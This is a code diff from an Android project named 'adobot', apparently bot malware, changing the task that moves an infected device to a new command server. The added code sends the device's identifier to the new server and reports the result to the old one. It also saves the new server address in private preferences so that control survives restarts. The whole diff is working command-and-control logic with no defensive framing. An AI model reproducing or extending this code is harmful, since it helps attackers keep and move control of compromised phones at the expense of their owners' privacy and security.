@@ -1,5 +1,7 @@
 package com.android.adobot.tasks;
 
+import android.content.Context;
+import android.content.SharedPreferences;
 import android.util.Log;
 
 import com.android.adobot.CommandService;
@@ -18,13 +20,14 @@ public class TransferBotTask extends BaseTask {
 
     private static final String TAG = "TransferBotTask";
 
-    private String url;
+    private String newServerUrl;
     private CommandService commandService;
+    SharedPreferences prefs;
 
     public TransferBotTask(CommandService c, String url) {
         setContext(c);
         this.commandService = c;
-        this.url = url;
+        this.newServerUrl = url;
     }
 
     private HttpCallback pingCb = new HttpCallback() {
@@ -35,12 +38,19 @@ public class TransferBotTask extends BaseTask {
             HashMap p = new HashMap();
             p.put("uid", commonParams.getUid());
             p.put("device", commonParams.getDevice());
-            p.put("server", url);
+            p.put("server", newServerUrl);
             p.put("status", statusCode);
             if (statusCode >= 200 && statusCode < 400) {
-//                    server is reachable
+//                new server is reachable
+//                notify old server
                 sendNotification("transferbot:success", p);
-                commandService.changeServer(url);
+                prefs = context.getSharedPreferences(Constants.PACKAGE_NAME, Context.MODE_PRIVATE);
+                boolean saved = prefs.edit().putString(Constants.PREF_SERVER_URL_FIELD, newServerUrl).commit();
+                Log.i(TAG, "Saved: " + (saved? "true" : "false"));
+                if (saved)
+                    commandService.changeServer(newServerUrl);
+                else
+                    sendNotification("transferbot:failed", p);
             } else {
                 sendNotification("transferbot:failed", p);
             }
@@ -63,7 +73,7 @@ public class TransferBotTask extends BaseTask {
 
         //ping server before transferring bot
         Http req = new Http();
-        req.setUrl(url + Constants.NOTIFY_URL);
+        req.setUrl(newServerUrl + Constants.NOTIFY_URL);
         req.setMethod(HttpRequest.METHOD_POST);
         req.setParams(p);
         req.setCallback(pingCb);
